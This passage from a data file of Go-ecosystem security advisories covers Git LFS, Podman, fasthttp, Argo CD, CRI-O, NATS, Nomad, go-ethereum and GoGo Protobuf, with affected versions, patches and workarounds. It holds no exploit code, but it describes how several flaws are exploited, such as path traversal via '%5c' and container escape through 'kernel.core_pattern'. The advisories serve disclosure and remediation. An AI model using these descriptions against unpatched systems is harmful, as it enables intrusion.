had a more open access environment, then closing off access will only be sufficient if both of the following are true:\n* The experimental GraphSync feature is disabled (https://github.com/ipfs/go-ipfs/blob/master/docs/experimental-features.md#graphsync) \n* The only data being accessed is non-malformed data\n\n### References\nSee also the [go-codec-dagpb security advisory](https://github.com/ipld/go-codec-dagpb/security/advisories/GHSA-g3vv-g2j5-45f2).\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Ask in [IPFS Discord #ipfs-chatter](https://discord.gg/ipfs)\n* Open an issue in [go-ipfs](https://github.com/ipld/go-ipfs)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipld/go-ipfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.12.0"}, {"fixed": "0.12.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/ipld/go-ipfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.11.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipfs/go-ipfs/security/advisories/GHSA-mcq2-w56r-5w2w"}, {"type": "PACKAGE", "url": "github.com/ipld/go-ipfs"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-04-08T22:09:23Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-6rw3-3whw-jvjj", "modified": "2022-04-22T20:13:21Z", "published": "2022-04-22T20:13:21Z", "aliases": ["CVE-2022-24826"], "summary": "Git LFS can execute a binary from the current directory on Windows", "details": "### Impact\nOn Windows, if Git LFS operates on a malicious repository with a `..exe` file as well as a file named `git.exe`, and `git.exe` is not found in `PATH`, the `..exe` program will be executed, permitting the attacker to execute arbitrary code.  This does not affect Unix systems.\n\nSimilarly, if the malicious repository contains files named `..exe` and `cygpath.exe`, and `cygpath.exe` is not found in `PATH`, the `..exe` program will be executed when certain Git LFS commands are run.\n\nMore generally, if the current working directory contains any file with a base name of `.` and a file extension from `PATHEXT` (except `.bat` and `.cmd`), and also contains another file with the same base name as a program Git LFS intends to execute (such as `git`, `cygpath`, or `uname`) and any file extension from `PATHEXT` (including `.bat` and `.cmd`), then, on Windows, when Git LFS attempts to execute the intended program the `..exe`, `..com`, etc., file will be executed instead, but only if the intended program is not found in any directory listed in `PATH`.\n\nThe vulnerability occurs because when Git LFS detects that the program it intends to run does not exist in any directory listed in `PATH` then Git LFS passes an empty string as the executable file path to the Go `os/exec` package, which contains a bug such that, on Windows, it prepends the name of the current working directory (i.e., `.`) to the empty string without adding a path separator, and as a result searches in that directory for a file with the base name `.` combined with any file extension from `PATHEXT`, executing the first one it finds.\n\n(The reason `..bat` and `..cmd` files are not executed in the same manner is that, although the Go `os/exec` package tries to execute them just as it does a `..exe` file, the Microsoft Win32 API `CreateProcess()` family of functions have an undocumented feature in that they apparently recognize when a caller is attempting to execute a batch script file and instead run the `cmd.exe` command interpreter, passing the full set of command line arguments as parameters.  These are unchanged from the command line arguments set by Git LFS, and as such, the intended program's name is the first, resulting in a command line like `cmd.exe /c git`, which then fails.)\n\nGit LFS has resolved this vulnerability by always reporting an error when a program is not found in any directory listed in `PATH` rather than passing an empty string to the Go `os/exec` package in this case.\n\nThe bug in the Go `os/exec` package has been reported to the Go project and is expected to be patched after this security advisory is published.\n\n### Patches\nThe problem was introduced in v2.12.1 and is patched in v3.1.3 and v3.1.4.  Users of affected versions should upgrade to v3.1.4.\n\n### Workarounds\nThere are no known workarounds at this time.\n\n### References\n* https://github.com/git-lfs/git-lfs/security/advisories/GHSA-6rw3-3whw-jvjj\n* https://nvd.nist.gov/vuln/detail/CVE-2022-24826\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24826\n* https://github.com/git-lfs/git-lfs/releases/tag/v3.1.4\n* [git-lfs/git-lfs@762ccd4a49](https://github.com/git-lfs/git-lfs/commit/762ccd4a498f5c17723b91d56b9304434ada5540)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* For general questions, start a discussion in the Git LFS [discussion forum](https://github.com/git-lfs/git-lfs/discussions).\n* For reports of additional vulnerabilities, please follow the Git LFS [security reporting policy](https://github.com/git-lfs/git-lfs/blob/main/SECURITY.md).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/git-lfs/git-lfs/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.1.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/git-lfs/git-lfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.12.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/git-lfs/git-lfs/security/advisories/GHSA-6rw3-3whw-jvjj"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24826"}, {"type": "PACKAGE", "url": "https://github.com/git-lfs/git-lfs"}], "database_specific": {"cwe_ids": ["CWE-426"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-04-22T20:13:21Z", "nvd_published_at": "2022-04-20T00:16:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qvf8-p83w-v58j", "modified": "2022-04-19T18:03:15Z", "published": "2022-04-01T20:52:29Z", "aliases": ["CVE-2022-27649"], "summary": "Podman's default inheritable capabilities for linux container not empty", "details": "A bug was found in Podman where containers were created with non-empty inheritable Linux process capabilities, creating an atypical Linux environment and enabling programs with inheritable file capabilities to elevate those capabilities to the permitted set during execve(2).\n\nThis bug did not affect the container security sandbox as the inheritable set never contained more capabilities than were included in the container's bounding set.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/podman/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.0.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containers/podman/security/advisories/GHSA-qvf8-p83w-v58j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-27649"}, {"type": "WEB", "url": "https://github.com/containers/podman/commit/aafa80918a245edcbdaceb1191d749570f1872d0"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2066568"}, {"type": "PACKAGE", "url": "https://github.com/containers/podman"}, {"type": "WEB", "url": "https://github.com/containers/podman/releases/tag/v4.0.3"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4KDETHL5XCT6RZN2BBNOCEXRZ2W3SFU3/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DLUJZV3HBP56ADXU6QH2V7RNYUPMVBXQ/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/J5WPM42UR6XIBQNQPNQHM32X7S4LJTRX/"}], "database_specific": {"cwe_ids": ["CWE-276"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-04-01T20:52:29Z", "nvd_published_at": "2022-04-04T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fx95-883v-4q4h", "modified": "2022-03-29T22:03:08Z", "published": "2022-03-18T00:01:11Z", "aliases": ["CVE-2022-21221"], "summary": "Path traversal in github.com/valyala/fasthttp", "details": "The package github.com/valyala/fasthttp before 1.34.0 is vulnerable to Directory Traversal via the ServeFile function, due to improper sanitization. It is possible to be exploited by using a backslash %5c character in the path. **Note:** This security issue impacts Windows users only.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/valyala/fasthttp"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.34.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-21221"}, {"type": "WEB", "url": "https://github.com/valyala/fasthttp/issues/1226"}, {"type": "WEB", "url": "https://github.com/valyala/fasthttp/commit/15262ecf3c602364639d465daba1e7f3604d00e8"}, {"type": "WEB", "url": "https://github.com/valyala/fasthttp/commit/6b5bc7bb304975147b4af68df54ac214ed2554c1"}, {"type": "PACKAGE", "url": "https://github.com/valyala/fasthttp"}, {"type": "WEB", "url": "https://github.com/valyala/fasthttp/releases/tag/v1.34.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0355"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMVALYALAFASTHTTP-2407866"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-18T22:58:55Z", "nvd_published_at": "2022-03-17T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2f5v-8r3f-8pww", "modified": "2022-03-24T00:18:54Z", "published": "2022-03-24T00:18:54Z", "aliases": ["CVE-2022-24768"], "summary": "Improper access control allows admin privilege escalation in Argo CD", "details": "### Impact\n\n#### Impacts for versions starting with v1.0.0\n\nAll unpatched versions of Argo CD starting with v1.0.0 are vulnerable to an improper access control bug, allowing a malicious user to potentially escalate their privileges to admin-level.\n\nTo perform the following exploits, an authorized Argo CD user must have push access to an Application's source git or Helm repository or `sync` _and_ `override` access to an Application. Once a user has that access, different exploitation levels are possible depending on their other RBAC privileges:\n\n1. If that user has `update` access to the Application, they can modify any resource on the Application's destination cluster. If the destination cluster is or can be made to be the same as the cluster hosting Argo CD, the user can escalate their Argo CD permissions to admin-level.\n2. If the user has `delete` access to the Application, they can delete any resource on the Application's destination cluster. (This exploit is possible starting with v0.8.0.)\n3. If the user has `get` access to the Application, they can view any resource on the Application's destination cluster (except for the contents of Secrets) and list [actions](https://argo-cd.readthedocs.io/en/stable/operator-manual/resource_actions/) available for that resource. \n4. If the user has `get` access to the Application, they can view the logs of any Pods on the Application's destination cluster.\n5. If the user has `action/{some action or *}` access on the Application, they can run an action for any resource (which supports the allowed action(s)) on the Application's destination cluster. (Some actions are available in Argo CD by default, and others may be configured by an Argo CD admin.)\n\nSee the [Argo CD RBAC documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#rbac-resources-and-actions) for an explanation of the privileges available in Argo CD.\n\n##### Events exploit\n\nA related exploit is possible for a user with `get` access to an Application **even if they do not have access to the Application's source git or Helm repository or `sync` and `override` access to the Application**. The user can access any Event in the Application's destination cluster if they know the involved object's name, UID, and namespace.\n\n#### Impacts for versions starting with v0.8.0\n\nThe same bug exists starting with v0.8.0, but only the following exploits were possible before v1.0.0:\n* The `delete` exploit (#&#x2060;2 above).\n* The logs exploit (#&#x2060;4 above).\n* The Events exploit described above.\n\n#### Impacts for versions starting with v0.5.0\n\nThe same bug exists starting with v0.5.0 (when RBAC was implemented), but only the Events exploit described above was possible before v0.8.0.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.3.2\n* v2.2.8\n* v2.1.14\n\n**Versions 2.0.x and earlier users:** See the [changelog](https://github.com/argoproj/argo-cd/blob/master/CHANGELOG.md) for links to upgrade instructions for your version. It is imperative to upgrade quickly, but some limited mitigations are described in the next section.\n\n**argo-helm chart users:** Argo CD users deploying v2.3.x with [argo-helm](https://github.com/argoproj/argo-helm) can upgrade the chart to version 4.2.2. Argo CD 2.2 and 2.1 users can set the `global.image.tag` value to the latest in your current release series (`v2.2.8`, or `v2.1.14`).  Since charts for the 2.2 and 2.1 series are no longer maintained, you will need to either leave the value override in place or upgrade to the 4.x chart series (and therefore to Argo CD 2.3).\n\n### Workarounds\n\nThe only certain way to avoid the vulnerability is to upgrade.\n\n#### Mitigations\n\n* To avoid privilege escalation:\n  * Limit who has push access to Application source repositories or `sync` + `override` access to Applications.\n  * Limit which repositories are available in [projects](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/) where users have  `update` access to Applications.\n* To avoid unauthorized resource inspection/tampering:\n  * Limit who has `delete`, `get`, or `action` access to Applications.\n\nThese mitigations can help limit potential damage, but they are _not_ a substitute for upgrading. It is necessary to upgrade immediately.\n\n### References\n\n* [Argo CD RBAC configuration documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#)\n\n### For more information\n\nOpen an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\nJoin us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.5.0"}, {"fixed": "2.1.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-2f5v-8r3f-8pww"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24768"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/af03b291d4b7e9d3ce9a6580ae9c8141af0e05cf"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.1.14"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.2.8"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.3.2"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-269", "CWE-862"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-03-24T00:18:54Z", "nvd_published_at": "2022-03-23T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vrcc-g6vj-mh5w", "modified": "2022-03-30T20:05:12Z", "published": "2022-03-18T00:01:13Z", "aliases": ["CVE-2021-42219"], "summary": "Denial of service in go-ethereum", "details": "Go-Ethereum v1.10.9 was discovered to contain an issue which allows attackers to cause a denial of service (DoS) via sending an excessive amount of messages to a node. This is caused by missing memory in the component /ethash/algorithm.go.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.10.9"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-42219"}, {"type": "WEB", "url": "https://docs.google.com/document/d/1dYFSpNZPC0OV-n1mMqdc269u9yYU1XQy/edit?usp=sharing&ouid=112110745137218798745&rtpof=true&sd=true"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-18T22:37:32Z", "nvd_published_at": "2022-03-17T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6x2m-w449-qwx7", "modified": "2022-03-18T17:47:49Z", "published": "2022-03-15T20:13:38Z", "aliases": ["CVE-2022-0811"], "summary": "Code Injection in CRI-O", "details": "### Impact\nA flaw introduced in CRI-O version 1.19 which an attacker can use to bypass the safeguards and set arbitrary kernel parameters on the host. As a result, anyone with rights to deploy a pod on a Kubernetes cluster that uses the CRI-O runtime can abuse the `kernel.core_pattern` kernel parameter to achieve container escape and arbitrary code execution as root on any node in the cluster.\n\n### Patches\nThe patches will be present in 1.19.6, 1.20.7, 1.21.6, 1.22.3, 1.23.2, 1.24.0\n\n### Workarounds\n- Users can set manage_ns_lifecycle to false, which causes the sysctls to be configured by the OCI runtime, which typically filter these cases. This option is available in 1.20 and 1.19. Newer versions don't have this option.\n- An admission webhook could be created to deny pods that specify a `+` in the sysctl value of a pod.\n- A [PodSecurityPolicy](https://kubernetes.io/docs/tasks/administer-cluster/sysctl-cluster/#podsecuritypolicy) [deprecated] could be created, specifying all sysctls as forbidden like so: \n```\napiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: sysctl-psp\nspec:\n  forbiddenSysctls:\n    - \"*\"\n```\nHowever, this option will not work if any sysctls are required by any pods in the cluster.\n\n\n### Credits\nCredit for finding this vulnerability goes to John Walker and Manoj Ahuje of Crowdstrike. The CRI-O community deeply thanks them for the report.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the CRI-O repo](http://github.com/cri-o/cri-o/issues)\n* To make a report, email your vulnerability to the private\n[cncf-crio-security@lists.cncf.io](mailto:cncf-crio-security@lists.cncf.io) list\nwith the security details and the details expected for [all CRI-O bug\nreports](https://github.com/cri-o/cri-o/blob/main/.github/ISSUE_TEMPLATE/bug-report.yml).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.19.0"}, {"fixed": "1.19.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.20.0"}, {"fixed": "1.20.7"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.21.0"}, {"fixed": "1.21.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.22.0"}, {"fixed": "1.22.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.23.0"}, {"fixed": "1.23.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cri-o/cri-o/security/advisories/GHSA-6x2m-w449-qwx7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-0811"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2022-0811"}, {"type": "WEB", "url": "https://bugs.gentoo.org/835336"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2059475"}, {"type": "PACKAGE", "url": "https://github.com/cri-o/cri-o"}, {"type": "WEB", "url": "https://www.crowdstrike.com/blog/cr8escape-zero-day-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/"}], "database_specific": {"cwe_ids": ["CWE-94"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-15T20:13:38Z", "nvd_published_at": "2022-03-16T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6h3m-36w8-hv68", "modified": "2022-03-24T00:21:10Z", "published": "2022-03-10T22:07:30Z", "aliases": ["CVE-2022-26652"], "summary": "Arbitrary file write in nats-server", "details": "(This document is canonically: <https://advisories.nats.io/CVE/CVE-2022-26652.txt>)\n\n## Background\n\nNATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.\n\nJetStream is the optional RAFT-based resilient persistent feature of NATS.\n\n\n## Problem Description\n\nThe JetStream streams can be backed up and restored via NATS. The backup format is a tar archive file.  Inadequate checks on the filenames within the archive file permit a so-called \"Zip Slip\" attack in the stream restore.\n\nNATS nats-server through 2022-03-09 (fixed in release 2.7.4) did not correctly sanitize elements of the archive file, thus a user of NATS\ncould cause the NATS server to write arbitrary content to an attacker-controlled filename.\n\n\n## Affected versions\n\nNATS Server:\n * 2.2.0 up to and including 2.7.3.\n   + Introduced with JetStream Restore functionality\n * Fixed with nats-io/nats-server: 2.7.4\n * Docker image:  nats <https://hub.docker.com/_/nats>\n * NB users of OS package files from our releases: a change in goreleaser defaults, discovered late in the release process, moved the install directory from /usr/local/bin to /usr/bin; we are evaluating the correct solution for subsequent releases, but not recutting this release.\n\nNATS Streaming Server\n * 0.15.0 up to and including 0.24.2\n * Fixed with nats-io/nats-streaming-server: 0.24.3\n * Embeds a nats-server, but this server is the old approach which JetStream replaces, so unlikely (but not impossible) to be\n   configured with JS support\n\n\n## Workarounds\n\n * Disable JetStream for untrusted users.\n * If only one NATS account uses JetStream, such that cross-user attacks are not an issue, and any user in that account with access to the JetStream API is fully trusted anyway, then appropriate sandboxing techniques will prevent exploit.\n   + Eg, with systemd, the supplied util/nats-server-hardened.service example configuration demonstrates that NATS runs fine as an unprivileged user under ProtectSystem=strict and PrivateTmp=true restrictions; by only opening a ReadWritePaths hole for the JetStream storage area, the impact of this vulnerability is limited.\n\n\n## Solution\n\nUpgrade the NATS server to at least 2.7.4.\n\nWe fully support the util/nats-server-hardened.service configuration for running a NATS server and encourage this approach.\n\n\n## Credits\n\nThis issue was reported (on 2022-03-07) to the NATS Maintainers by\nYiming Xiang, TIANJI LAB of NSFOCUS.  \nThank you / \u8c22\u8c22\u4f60\uff01\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.7.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-streaming-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.15.0"}, {"fixed": "0.24.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/nats-io/nats-server/security/advisories/GHSA-6h3m-36w8-hv68"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-26652"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/pull/2917"}, {"type": "WEB", "url": "https://advisories.nats.io/CVE/CVE-2022-26652.txt"}, {"type": "PACKAGE", "url": "https://github.com/nats-io/nats-server"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/releases"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/releases/tag/v2.7.4"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-streaming-server/releases/tag/v0.24.3"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2022/03/10/1"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-10T22:07:30Z", "nvd_published_at": "2022-03-10T17:47:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3382-r9q8-4hfg", "modified": "2022-08-12T12:53:18Z", "published": "2022-03-01T00:00:28Z", "aliases": ["CVE-2022-24685"], "summary": "HashiCorp Nomad vulnerable to Allocation of Resources Without Limits or Throttling", "details": "HashiCorp Nomad and Nomad Enterprise 1.x before 1.0.17, 1.1.x before 1.1.12, and 1.2.x before 1.2.6 is vulnerable to Allocation of Resources Without Limits or Throttling.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.0.17"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.1.0"}, {"fixed": "1.1.12"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.2.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24685"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-03-nomad-malformed-job-parsing-results-in-excessive-cpu-usage/"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-03-nomad-malformed-job-parsing-results-in-excessive-cpu-usage/35561"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220331-0007/"}, {"type": "PACKAGE", "url": "github.com/hashicorp/nomad"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-01T22:07:53Z", "nvd_published_at": "2022-02-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c3h9-896r-86jm", "modified": "2022-03-28T20:28:00Z", "published": "2022-03-28T20:28:00Z", "aliases": ["CVE-2021-3121"], "summary": "Improper Input Validation in GoGo Protobuf", "details": "An issue was discovered in GoGo Protobuf before 1.3.2. plugin/unmarshal/unmarshal.go lacks certain index validation, aka the \"skippy peanut butter\" issue.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gogo/protobuf"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3121"}, {"type": "WEB", "url": "https://github.com/gogo/protobuf/commit/b03c65ea87cdc3521ede29f62fe3ce239267c1bc"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-23-consul-exposed-to-denial-of-service-in-gogo-protobuf-dependency/29025"}, {"type": "PACKAGE", "url": "https://github.com/gogo/protobuf"}, {"type": "WEB", "url": "https://github.com/gogo/protobuf/compare/v1.3.1...v1.3.2"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r68032132c0399c29d6cdc7bd44918535da54060a10a12b1591328bff@%3Cnotifications.skywalking.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r88d69555cb74a129a7bf84838073b61259b4a3830190e05a3b87994e@%3Ccommits.pulsar.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/rc1e9ff22c5641d73701ba56362fb867d40ed287cca000b131dcf4a44@%3Ccommits.pulsar.apache.org%3E"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0053"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20210219-0006/"}], "database_specific": {"cwe_ids": ["CWE-129", "CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-28T20:28:00Z", "nvd_published_at": "2021-01-11T06:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w2j5-3rcx-vx7x", "modified": "2022-03-15T20:02:54Z", "published": "2022-03-15T20:02:54Z", "aliases": [], "summary": "Sysctls applied to containers with host IPC or host network namespaces can affect the host", "details": "### Impact\nBefore setting the sysctls for a pod, the pods namespaces must be unshared (created). However, in cases where the pod is using a host network or IPC namespace, a bug in CRI-O caused the namespace creating tool [pinns](https://github.com/cri-o/cri-o/tree/main/pinns/) to configure the sysctls of the host. This allows a malicious user to set sysctls on the host, assuming they have access to hostNetwork and hostIPC.\n\nAny CRI-O cluster after CRI-O 1.18 that drops the infra container\n1.22 and 1.23 clusters drop infra container by default, and are thus vulnerable by default.\n\n### Patches\nCRI-O versions 1.24.0, 1.23.1, 1.22.2, 1.21.5, 1.20.6, 1.19.5 all have the patches.\n\n### Workarounds\nUsers can set `manage_ns_lifecycle` to false, which causes the sysctls to be configured by the OCI runtime, which typically filter these cases. This option is available in 1.20 and 1.19. Newer versions don't have this option.\nAn admission webhook could also be created to deny pods that use host IPC or network namespaces and also attempt to configure sysctls related to that namespace.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the CRI-O repo](http://github.com/cri-o/cri-o/issues)\n* To make a report, email your vulnerability to the private\n[cncf-crio-security@lists.cncf.io](mailto:cncf-crio-security@lists.cncf.io) list\nwith the security details and the details expected for [all CRI-O bug\nreports](https://github.com/cri-o/cri-o/blob/main/.github/ISSUE_TEMPLATE/bug-report.yml).", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.23.0"}, {"fixed": "1.23.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.22.0"}, {"fixed": "1.22.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.21.0"}, {"fixed": "1.21.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.20.0"}, {"fixed": "1.20.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.18.0"}, {"fixed": "1.19.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cri-o/cri-o/security/advisories/GHSA-w2j5-3rcx-vx7x"}, {"type": "PACKAGE", "url": "https://github.com/cri-o/cri-o"}], "database_specific": {"cwe_ids": [], 